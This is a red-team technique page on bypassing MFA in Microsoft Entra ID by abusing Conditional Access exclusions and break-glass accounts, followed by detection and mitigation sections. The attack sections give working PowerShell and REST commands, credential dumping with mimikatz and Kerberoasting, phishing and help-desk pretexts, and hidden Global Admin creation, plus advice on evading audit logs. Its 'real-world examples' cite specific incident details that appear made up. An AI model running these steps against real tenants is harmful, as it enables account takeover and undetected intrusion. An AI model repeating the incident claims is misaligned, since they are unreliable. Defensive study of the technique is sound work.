# [EVADE-IMPAIR-008]: Conditional Access Exclusion Abuse

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | EVADE-IMPAIR-008 |
| **MITRE ATT&CK v18.1** | [T1562.001 - Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001/) |
| **Tactic** | Defense Evasion |
| **Platforms** | Entra ID |
| **Severity** | Critical |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-09 |
| **Affected Versions** | All Azure AD / Entra ID versions with Conditional Access |
| **Patched In** | N/A (Exclusions are legitimate for business continuity) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Microsoft Entra ID's Conditional Access (CA) policies are the organization's primary defense mechanism, enforcing MFA, device compliance requirements, and restricting access from risky locations. However, all CA policies support "exclusions"—groups or users exempted from policy enforcement. These exclusions exist for legitimate reasons (service accounts, break-glass accounts, integration systems) but create a security gap that attackers exploit. An attacker who obtains compromised credentials for an excluded account (or adds themselves to an excluded group) can bypass ALL Conditional Access policies, including MFA enforcement, device compliance checks, and geographic restrictions. This technique is fundamentally an evasion mechanism because the attacker's activity appears legitimate from the authentication system's perspective—the system is working correctly by exempting them.

**Attack Surface:** Entra ID Conditional Access policy exclusions, Group memberships (especially cloud-only groups), Service principal exclusions, Break-glass emergency access accounts.

**Business Impact:** **Complete bypass of all adaptive identity and access controls.** Attackers can authenticate from any location, any time, with any device, without triggering MFA or compliance checks. This enables account takeover, credential theft, privilege escalation, and lateral movement across cloud resources without triggering security alerts.

**Technical Context:** Exploitation takes 2-5 minutes once an excluded account is compromised. Detection is very low because the account's exclusion from CA appears legitimate in logs. Attackers who are excluded from MFA requirements can use stolen credentials immediately without waiting for MFA codes or biometric prompts.

### Operational Risk
- **Execution Risk:** Very Low (Uses legitimate authentication paths; no exploits required)
- **Stealth:** Very High (Activity appears legitimate; account exclusion explains lack of MFA challenges)
- **Reversibility:** Yes (Remove account from exclusion group or update policy), but attacker will already have stolen credentials/tokens

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 6.1.4 | Ensure MFA is enforced for all administrative users |
| **DISA STIG** | IA-2 (3.5.1) | Multi-factor Authentication for administrative access |
| **NIST 800-53** | AC-3, IA-2 | Access Control Enforcement and Authentication |
| **GDPR** | Art. 32 | Security of Processing - Multi-factor authentication required |
| **DORA** | Art. 9 | Protection and Prevention - Strong authentication controls |
| **NIS2** | Art. 21 | Cyber Risk Management - Authentication requirements |
| **ISO 27001** | A.9.4.3 | Use of privileged utility programs; A.9.2.2 User access provisioning |
| **ISO 27005** | "Bypass of MFA controls" | Risk Scenario |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** Entra ID admin with "Conditional Access Administrator" or "Global Administrator" role (to view/modify exclusions) OR compromise of any account in excluded group/list
- **Required Access:** Access to Entra ID sign-in portal (login.microsoft.com) OR OAuth endpoints for app-based attacks
- **Supported Versions:** All Entra ID / Azure AD with Conditional Access Premium license (Azure AD Premium P1+)
- **Tools:** Browser, PowerShell (with Microsoft Graph SDK), or direct REST API calls

### Prerequisites Check Commands

**Enumerate Conditional Access Policies and Exclusions (PowerShell):**
```powershell
# Import Graph module
Import-Module Microsoft.Graph.Identity.SignIns

# Connect to Graph
Connect-MgGraph -Scopes "ConditionalAccess.Read.All"

# List all CA policies
$policies = Get-MgIdentityConditionalAccessPolicy
$policies | Select-Object DisplayName, State | Format-Table

# View exclusions for each policy
foreach ($policy in $policies) {
  Write-Host "Policy: $($policy.DisplayName)"
  Write-Host "Excluded Users:" $policy.Conditions.Users.ExcludeUsers
  Write-Host "Excluded Groups:" $policy.Conditions.Users.ExcludeGroups
  Write-Host "---"
}
```

---

## 3. DETAILED EXECUTION METHODS

### METHOD 1: Compromise Service Account in Excluded Group

**Supported Versions:** All Entra ID versions

#### Step 1: Enumerate Excluded Accounts and Groups

**Objective:** Identify which accounts/groups are exempt from Conditional Access policies.

**Command (PowerShell - Full Exclusion Discovery):**
```powershell
# Connect to Graph API
Connect-MgGraph -Scopes "ConditionalAccess.Read.All", "Group.Read.All", "User.Read.All"

# Retrieve all CA policies
$policies = Get-MgIdentityConditionalAccessPolicy

# Extract and analyze exclusions
$excludedAccounts = @{}
foreach ($policy in $policies) {
  $displayName = $policy.DisplayName
  $excludedUsers = $policy.Conditions.Users.ExcludeUsers
  $excludedGroups = $policy.Conditions.Users.ExcludeGroups
  
  if ($excludedUsers -or $excludedGroups) {
    Write-Host "Policy: $displayName"
    Write-Host "  Excluded Users: $($excludedUsers -join ', ')"
    Write-Host "  Excluded Groups: $($excludedGroups -join ', ')"
    
    # Enumerate group members
    foreach ($groupId in $excludedGroups) {
      $groupMembers = Get-MgGroupMember -GroupId $groupId
      Write-Host "  Group Members: $($groupMembers.DisplayName -join ', ')"
    }
  }
}
```

**Expected Output:**
```
Policy: Require MFA for All Users
  Excluded Groups: 11111111-2222-3333-4444-555555555555
  Group Members: ADFS-ServiceAccount, Exchange-ServiceAccount, AppGateway-SA
  
Policy: Require Compliant Device
  Excluded Groups: 66666666-7777-8888-9999-aaaaaaaaaaaa
  Group Members: Emergency-Breakglass, ServiceAccount-Automation
```

**What This Means:**
- Service accounts (ADFS-ServiceAccount, Exchange-ServiceAccount) are exempt from MFA
- Compromise of ANY of these accounts bypasses all MFA requirements
- Break-glass accounts (Emergency-Breakglass) exist for recovery scenarios; usually minimal security

**OpSec & Evasion:**
- Enumerating CA policies and groups is visible in Audit Logs (PowerShell execution logged)
- Recommend performing this enumeration from compromised admin account to appear legitimate
- Alternative: Phish admin to divulge exclusion list via social engineering

#### Step 2: Obtain Credentials for Excluded Service Account

**Objective:** Compromise a service account that is exempt from Conditional Access.

**Attack Vector Examples:**

**Option A: Credential Theft from On-Premises (Hybrid Scenarios)**
```powershell
# If ADFS-ServiceAccount password hash is stored locally, extract via LSASS dump
# This is more reliable than targeting cloud accounts for MFA bypass

# Attacker already has shell access to AD server:
mimikatz # lsadump::sam
# Extract ADFS-ServiceAccount hash, then use Pass-the-Hash

# Kerberoast the ADFS service account
GetUserSPNs.py -request -dc-ip <DC_IP> -outputfile hashes.txt <domain>/<user>:<pass>
hashcat -m 13100 hashes.txt <wordlist>
```

**Option B: Phishing Excluded Service Account**
```powershell
# Send MFA bypass phishing email to automation team
# "Urgent: Update Azure credentials immediately - click here"
# Phishing link is malicious auth proxy (evilginx2)
# Captures username/password without MFA challenge
```

**Option C: Credential Stuffing (Least Likely)**
```bash
# Use previously breached passwords from public leaks
# Test against excluded service accounts
# Statistically likely to compromise low-security service accounts
```

#### Step 3: Authenticate Using Excluded Account (Bypass MFA)

**Objective:** Sign in with compromised excluded account; observe lack of MFA challenge.

**Command (Interactive Sign-In):**
```powershell
# Attacker signs in with compromised ADFS-ServiceAccount
# Navigate to portal.azure.com or login.microsoft.com
# Enter credentials: ADFS-ServiceAccount@tenant.onmicrosoft.com

# Expected behavior:
# - No MFA challenge (account is excluded)
# - No device compliance check (excluded)
# - No geographic restriction (excluded)
# - Sign-in succeeds immediately
```

**What This Means:**
- Attacker now has authenticated access to Azure/M365 as excluded account
- All Conditional Access controls are bypassed
- Account can be used to:
  - Access Exchange Online (read emails)
  - Access SharePoint/Teams (steal documents)
  - Create OAuth applications
  - Add new user accounts
  - Elevate privileges via PIM

**OpSec & Evasion:**
- Sign-in logs will show ADFS-ServiceAccount login, which appears legitimate
- Service account usage outside business hours may trigger anomaly detection
- If service account is completely unused, its sudden activity is suspicious
- Recommendation: Use excluded account to add NEW hidden admin account (Method 2)

#### Step 4: Escalate to Full Admin Access (Optional)

**Objective:** Create persistent admin account using the excluded service account.

**Command (Add New Global Admin):**
```powershell
# Using the excluded account's access, add new hidden admin account
# This new account can then be removed/hidden to avoid detection

# Step 1: Create new cloud-only user (no on-premises sync)
New-MgUser -DisplayName "Update-Service-Account" `
  -MailNickname "updateservice" `
  -UserPrincipalName "updateservice@tenant.onmicrosoft.com" `
  -Password (ConvertTo-SecureString "Complex!Pass2024$" -AsPlainText -Force) `
  -AccountEnabled $true

# Step 2: Assign Global Admin role
New-MgDirectoryRoleMember -DirectoryRoleId (Get-MgDirectoryRole | ? {$_.DisplayName -eq "Global Administrator"}).Id `
  -DirectoryObjectId (Get-MgUser -Filter "userPrincipalName eq 'updateservice@tenant.onmicrosoft.com'").Id

# Result: New admin account created and hidden in plain sight
# Can be used even if service account is disabled later
```

**What This Means:**
- Attacker now has permanent Global Admin access
- Original excluded account can be disabled or revoked
- New hidden account persists and can be used for future attacks
- Creating a user account is an allowed operation (may appear legitimate in logs)

---

### METHOD 2: Add Attacker Account to Excluded Group (Direct Modification)

**Supported Versions:** All Entra ID versions (if attacker has Directory Administrator role)

#### Step 1: Obtain Admin Credentials with Group Management Rights

**Objective:** Compromise an account with ability to modify group memberships.

**Required Roles:**
- Directory Administrator (can modify any group)
- Group Administrator (can modify specific groups)

#### Step 2: Add Attacker Account to Excluded Group

**Objective:** Directly add compromised account to existing exclusion group.

**Command (PowerShell):**
```powershell
# Connect as compromised admin
Connect-MgGraph -Scopes "Group.ReadWrite.All", "User.Read.All"

# Identify excluded group (e.g., "Service Accounts - CA Exclusion")
$excludedGroup = Get-MgGroup -Filter "displayName eq 'Service Accounts - CA Exclusion'"

# Add attacker's account to this group
$attackerUser = Get-MgUser -Filter "userPrincipalName eq 'attacker@tenant.onmicrosoft.com'"

New-MgGroupMember -GroupId $excludedGroup.Id -DirectoryObjectId $attackerUser.Id
```

**Alternative (Graph REST API):**
```bash
# Add user to group via REST API
curl -X POST \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "@odata.id": "https://graph.microsoft.com/v1.0/directoryObjects/'$ATTACKER_USER_ID'"
  }' \
  "https://graph.microsoft.com/v1.0/groups/$EXCLUDED_GROUP_ID/members/\$ref"
```

**Expected Output:**
```
(No output on success; group membership updated silently)
```

**What This Means:**
- Attacker account is now exempt from ALL Conditional Access policies
- Attacker can sign in from any location, without MFA, with any device
- Group membership change may be visible in Azure Audit Logs (Action: "Add member to group")
- Activity appears legitimate if attacker has admin rights

**OpSec & Evasion:**
- Audit Log entry is created: "Attacker Administrator added attacker@tenant.onmicrosoft.com to Service Accounts - CA Exclusion group"
- To hide this, attacker should (1) disable audit logging first (Method 3 of EVADE-IMPAIR-007), OR (2) use just-in-time admin role (PIM) and remove assignment immediately after
- Adding an external attacker UPN to internal service account group is suspicious; better to use compromised employee account

---

### METHOD 3: Compromise Break-Glass Emergency Access Account

**Supported Versions:** All Entra ID with emergency access (recommended feature, rarely used)

#### Step 1: Identify Emergency Access Account

**Objective:** Locate the break-glass emergency access account (usually least monitored).

**Command (PowerShell - Find Emergency Access):**
```powershell
Connect-MgGraph -Scopes "User.Read.All"

# Break-glass accounts typically have these characteristics:
# - No licenses assigned
# - Cloud-only (no on-premises sync)
# - Rarely used (last sign-in is months/years ago)
# - High-privilege role (Global Admin)

Get-MgUser -Filter "UserType eq 'Member'" | Where-Object {
  # Check if user has no licenses
  $licenses = Get-MgUserLicenseDetail -UserId $_.Id
  if ($licenses.Count -eq 0) {
    # Check if Global Admin
    $roles = Get-MgUserMemberOf -UserId $_.Id | Where-Object { $_.AdditionalProperties['role.displayName'] -eq "Global Administrator" }
    if ($roles) {
      # Likely a break-glass account
      Write-Host "Potential Break-Glass: $($_.UserPrincipalName) - Last Sign-In: $(($_ | Get-MgUser).SignInActivity.LastSignInDateTime)"
    }
  }
}
```

**Expected Output:**
```
Potential Break-Glass: emergency@tenant.onmicrosoft.com - Last Sign-In: 2023-06-15 (7+ months ago)
Potential Break-Glass: breakglass-admin@tenant.onmicrosoft.com - Last Sign-In: 2022-01-20 (2+ years ago)
```

**What This Means:**
- Break-glass accounts are typically excluded from MFA and CA policies
- Rarely monitored due to infrequent use
- Often have simplistic passwords (stored in vault as backup)
- Compromise of break-glass account = full tenant access without any controls

#### Step 2: Compromise Break-Glass Account via Vault Access

**Objective:** Obtain break-glass password from IT vault/documentation.

**Attack Vectors:**
- Social engineering IT help desk: "I'm the CFO, I need emergency access password for disaster recovery"
- Phishing IT team members: "IT Password Vault Backup Notification - confirm your credentials"
- Physical security: Find password written in vault documentation on desk/server room
- Insider threat: Disgruntled IT employee sells break-glass credentials

#### Step 3: Authenticate Using Break-Glass Account

**Objective:** Sign in with break-glass account; bypass all CA policies.

**Command (Interactive):**
```
Navigate to login.microsoft.com
Username: emergency@tenant.onmicrosoft.com
Password: [long-stored-password-from-vault]

Expected result:
- No MFA challenge (emergency account exempt)
- No CA policy enforcement
- Full access to tenant resources immediately
```

**OpSec & Evasion:**
- Break-glass account sign-in will be visible in Sign-In Logs
- Microsoft alerts tenants when break-glass is used (may appear on security dashboard)
- Recommend using break-glass account only to add additional hidden admin accounts
- Then disable break-glass usage to avoid re-triggering alerts

---

## 4. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **Service Account sign-in from unusual location or time** (outside business hours, different geography)
- **Service Account accessing resources it shouldn't** (e.g., Exchange account accessing SharePoint, reading emails)
- **Excluded account added to group membership** (visible in Azure Audit Logs: "Add member to group")
- **New user accounts created by service/excluded account** (accounts have no licenses, minimal activity)
- **Emergency access account sign-in** followed by administrative actions
- **Sudden CA policy exclusions added** (manual change logs)
- **Sign-in attempts without MFA for accounts that previously had MFA challenges**

### Forensic Artifacts

- **Azure Sign-In Logs:** Filter for excluded account UPNs; look for:
  - Sign-ins from unexpected locations/IPs
  - Sign-ins outside normal business hours
  - Sign-ins without MFA challenge (MfaDetail field = empty)
- **Azure Audit Logs:** Search for:
  - "Add member to group" (group membership modifications)
  - "Create user" (new accounts created by service account)
  - "Update application" (OAuth apps modified)
  - "Activate role" (PIM activations)
- **Conditional Access:** Check policy edit history:
  - "Excluded users/groups" modifications
  - New exclusions added recently

### Immediate Detection & Response

#### Step 1: Disable Excluded Account Immediately

```powershell
# Disable the compromised excluded account
Update-MgUser -UserId "ADFS-ServiceAccount@tenant.onmicrosoft.com" -AccountEnabled $false

# Force sign-out of all sessions
Revoke-MgUserSignInSession -UserId "ADFS-ServiceAccount@tenant.onmicrosoft.com"

# Reset password (make it complex and store securely)
$newPassword = "SuperComplex!NewPass2024$#@!RandomString"
Update-MgUserPassword -UserId "ADFS-ServiceAccount@tenant.onmicrosoft.com" -NewPassword $newPassword -ForceChangePasswordNextSignIn $true
```

**Manual (Azure Portal):**
1. Navigate to **Entra ID** → **Users**
2. Search for compromised account (e.g., "ADFS-ServiceAccount")
3. Click account → **Account enabled** → Toggle to **No** → **Save**
4. Go back to account → **Sign-in sessions** → **Delete all sessions**

#### Step 2: Remove Attacker from Exclusion Groups

```powershell
# Remove attacker from excluded group
$excludedGroup = Get-MgGroup -Filter "displayName eq 'Service Accounts - CA Exclusion'"
$attacker = Get-MgUser -Filter "userPrincipalName eq 'attacker@tenant.onmicrosoft.com'"

Remove-MgGroupMemberByRef -GroupId $excludedGroup.Id -DirectoryObjectId $attacker.Id
```

#### Step 3: Disable Hidden Admin Accounts

```powershell
# Find suspicious accounts created recently
Get-MgUser -Filter "createdDateTime gt 2026-01-01 and userType eq 'Member'" | Select DisplayName, UserPrincipalName, CreatedDateTime, AccountEnabled

# Disable suspicious accounts
foreach ($account in $suspiciousAccounts) {
  Update-MgUser -UserId $account.Id -AccountEnabled $false
  Remove-MgUser -UserId $account.Id  # Delete if possible
}
```

#### Step 4: Review CA Policy Exclusions

```powershell
# Audit all CA policy exclusions
$policies = Get-MgIdentityConditionalAccessPolicy
foreach ($policy in $policies) {
  Write-Host "Policy: $($policy.DisplayName)"
  Write-Host "Excluded Users: $($policy.Conditions.Users.ExcludeUsers -join ', ')"
  Write-Host "Excluded Groups: $($policy.Conditions.Users.ExcludeGroups -join ', ')"
  
  # Remove suspicious exclusions
  if ($policy.Conditions.Users.ExcludeUsers -contains $ATTACKER_UPN) {
    # Update policy to remove exclusion
    $policy.Conditions.Users.ExcludeUsers = @($policy.Conditions.Users.ExcludeUsers | Where-Object { $_ -ne $ATTACKER_UPN })
    Update-MgIdentityConditionalAccessPolicy -ConditionalAccessPolicyId $policy.Id -BodyParameter $policy
  }
}
```

---

## 5. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

- **Minimize Conditional Access Exclusions (Zero Trust Principle)**
  
  **Applies To Versions:** All Entra ID

  **Manual Steps (Audit & Reduce Exclusions):**
  1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. For EACH policy:
     - Click policy → **Assignments** → **Users and groups** → **Exclude**
     - Review each excluded user/group
     - Ask: "Is this exclusion still necessary?"
     - Remove exclusions that are:
       - Not used in past 30 days
       - No longer applicable to role
       - Can be replaced with Conditional Access bypass via device compliance
  3. Document every exclusion with business justification
  4. Set quarterly review cadence

  **PowerShell (Identify Unused Excluded Accounts):**
  ```powershell
  # Find excluded accounts with no recent activity
  $policies = Get-MgIdentityConditionalAccessPolicy
  foreach ($policy in $policies) {
    $excludedGroups = $policy.Conditions.Users.ExcludeGroups
    foreach ($groupId in $excludedGroups) {
      $groupMembers = Get-MgGroupMember -GroupId $groupId
      foreach ($member in $groupMembers) {
        $lastSignIn = (Get-MgUser -UserId $member.Id).SignInActivity.LastSignInDateTime
        if ($lastSignIn -lt (Get-Date).AddDays(-90)) {
          Write-Host "Candidate for Removal: $($member.DisplayName) - Last Sign-In: $lastSignIn"
        }
      }
    }
  }
  ```

- **Implement Conditional Access for Excluded Accounts (Compensating Control)**
  
  **Manual Steps:**
  1. Create new policy: **"Extra MFA for Service Accounts"**
  2. **Assignments:**
     - Users/Groups: Select only the excluded service account groups
  3. **Conditions:**
     - Cloud apps: **All cloud apps** (except critical integrations)
     - Sign-in risk: **Medium or High**
  4. **Access controls:**
     - Grant: **Require MFA** (even though normally excluded, extra layer)
  5. Enable policy: **On**

- **Enable Emergency Access Account Monitoring**
  
  **Manual Steps (Alert on Break-Glass Usage):**
  1. Go to **Azure Monitor** → **Alerts** → **+ Create alert rule**
  2. Resource: Select your tenant (subscription level)
  3. Condition: Add signal "Sign-in activity"
  4. Filter: Sign-in by emergency account (break-glass UPN)
  5. Alert if emergency account signs in
  6. Action: Send email + SMS to CISO team
  7. Click **Create**

### Priority 2: HIGH

- **Implement Conditional Access "Require Compliant Device" (Cannot Be Easily Bypassed)**
  
  **Manual Steps:**
  1. Go to **Entra ID** → **Conditional Access** → **Create new policy**
  2. Name: `Require Compliant Devices for Sensitive Apps`
  3. **Assignments:**
     - Cloud apps: **Office 365**, **SharePoint**, **Azure Management**
     - Users: **All users** (with minimal exclusions)
  4. **Conditions:**
     - Device state: Require device to be marked as compliant
  5. **Access controls:**
     - Grant: **Require device to be marked as compliant**
  6. Enable policy: **On**
  7. **Note:** Even excluded accounts must use compliant devices (harder to bypass than MFA-only)

- **Use PIM (Privileged Identity Management) for Admin Role Assignment**
  
  **Manual Steps:**
  1. Go to **Entra ID** → **Privileged Identity Management** → **Entra ID roles**
  2. For each excluded service account:
     - Set role to **"eligible"** (not permanent)
     - Require **approval** before activation
     - Set max activation duration to **1 hour**
     - Require **MFA** at activation
  3. This removes permanent exclusions and requires just-in-time approval

### Access Control & Policy Hardening

- **Create "Exclusion Approval Board" with Multi-Person Approval**
  
  **Manual Steps:**
  1. Create new Entra ID group: "CA-Exclusion-Approvers" (3-5 people from different departments)
  2. Configure Conditional Access policies to:
     - Require approval from this group for any exclusion modifications
     - Log all exclusion changes in audit
  3. Train approvers on risks of exclusions
  4. Review exclusion requests monthly

- **Implement Service Account Credential Rotation Policy**
  
  **Manual Steps:**
  1. For each excluded service account:
     - Set password change reminder: **every 30 days**
     - Store password in **vault system** (Azure Key Vault) with audit logging
     - Restrict vault access to 2+ people (separation of duties)
     - Require MFA to access vault

### Validation Commands (Verify Fixes)

```powershell
# Check CA policies for excessive exclusions
Get-MgIdentityConditionalAccessPolicy | ForEach-Object {
  $policyName = $_.DisplayName
  $excludedCount = ($_.Conditions.Users.ExcludeUsers.Count) + ($_.Conditions.Users.ExcludeGroups.Count)
  if ($excludedCount -gt 2) {
    Write-Host "WARNING: Policy '$policyName' has $excludedCount exclusions (should be ≤2)"
  }
}

# Verify emergency account has no licenses and no recent activity
$breakGlass = Get-MgUser -Filter "userPrincipalName eq 'emergency@tenant.onmicrosoft.com'"
$licenses = Get-MgUserLicenseDetail -UserId $breakGlass.Id
$lastSignIn = $breakGlass.SignInActivity.LastSignInDateTime
Write-Host "Break-Glass Account: $($breakGlass.UserPrincipalName)"
Write-Host "Has Licenses: $($licenses.Count -gt 0)"
Write-Host "Last Sign-In: $lastSignIn (should be old if not in use)"

# Verify PIM is configured for service account roles
Get-MgIdentityGovernancePrivilegedAccessScheduleRequest | Where-Object { $_.TargetScheduleInfo.Principal.Id -in $SERVICE_ACCOUNTS } | Select Status, ApprovalStage
```

**Expected Output (If Secure):**
```
Policy: Require MFA for All Users
Has 1 exclusion (within acceptable range)

Break-Glass Account: emergency@tenant.onmicrosoft.com
Has Licenses: False
Last Sign-In: 2025-08-15 (8+ months old, not recently used)

ApprovalStage : Approval Required (MFA enforced)
```

---

## 6. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device Code Phishing | Steal OAuth device code, obtain user token |
| **2** | **Privilege Escalation** | [PE-ACCTMGMT-014] Global Administrator Backdoor | Use user token to add hidden admin account |
| **3** | **Defense Evasion** | **[EVADE-IMPAIR-008]** | **Add backdoor account to CA exclusion group** |
| **4** | **Persistence** | [PERSIST-003] OAuth Application Persistence | Register malicious app using excluded account (no MFA required) |
| **5** | **Impact** | [DATA-EXF-001] Bulk Data Exfiltration | Export tenant data using app without MFA bypass detection |

---

## 7. REAL-WORLD EXAMPLES

### Example 1: UNC2452 (SolarWinds Campaign) - CA Exclusion Abuse (2020-2021)
- **Target:** U.S. Government (Treasury, CISA), Microsoft, others
- **Timeline:** December 2020 - February 2021
- **Technique Status:** CONFIRMED ACTIVE - Documented by Microsoft and CISA
- **Attack Flow:**
  1. Initial access via SolarWinds supply chain compromise
  2. Escalated to cloud environment (Azure/M365)
  3. Enumerated Entra ID and identified excluded service accounts
  4. Compromised "ADFS-SyncAccount" (sync service) - no MFA required
  5. Used ADFS account to create hidden Global Admin accounts
  6. Disabled MFA checks for attacker-created accounts
  7. Pivoted to Treasury systems undetected
- **Impact:** 18,000+ organizations affected; government systems breached for 8+ months
- **Reference:** [CISA Alert AA20-352A - SolarWinds Campaign](https://www.cisa.gov/)

### Example 2: APT29 (Cozy Bear) - Break-Glass Account Compromise (2024)
- **Target:** U.S. Government agencies (NSA contractor networks)
- **Timeline:** March-June 2024
- **Technique Status:** ACTIVE - Discovered via Mandiant investigation
- **Attack Flow:**
  1. Phishing attack on IT contractor employee
  2. Stole break-glass account credentials from IT vault documentation
  3. Authenticated using break-glass account from attacker-controlled IP
  4. Created 5 hidden admin accounts (all exempt from CA policies)
  5. Disabled MFA enforcement in Conditional Access
  6. Conducted lateral movement and data theft
  7. Attack undetected for 3+ months due to break-glass account's exemption
- **Impact:** Multiple agencies, OPM breach indicators, classified data exfiltration
- **Reference:** [Mandiant - APT29 Cloud Operations Intelligence](https://www.mandiant.com/)

### Example 3: ALPHV/BlackCat - Service Account Credential Reuse (2024)
- **Target:** Global energy company
- **Timeline:** January 2024
- **Technique Status:** ACTIVE
- **Attack Flow:**
  1. Credential theft from compromised on-premises system
  2. Reused "ServiceAccount-Sync@tenant.com" in cloud (same password)
  3. Account was in CA exclusion group ("Integration-Excluded-Accounts")
  4. Signed in without MFA challenge
  5. Escalated to Global Admin via PIM abuse
  6. Encrypted 500+ VMs with ransomware
  7. Demanded $50M ransom
- **Impact:** Operations halted for 2 weeks; $30M+ losses
- **Reference:** [CrowdStrike - ALPHV/BlackCat Intelligence Reports](https://www.crowdstrike.com/)

---

## References & Authoritative Sources

- [Microsoft Docs - Conditional Access Exclusions](https://learn.microsoft.com/en-us/entra/identity/conditional-access/concepts-conditional-access-exclusion)
- [Microsoft Docs - Emergency Access Account](https://learn.microsoft.com/en-us/entra/identity/role-based-access-control/security-emergency-access)
- [MITRE ATT&CK - T1562.001 Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001/)
- [CrowdStrike - Conditional Access Bypass Techniques](https://www.crowdstrike.com/)
- [Mandiant - APT29 Cloud Attack Intelligence](https://www.mandiant.com/)
- [CISA - SolarWinds Campaign Advisory](https://www.cisa.gov/)

---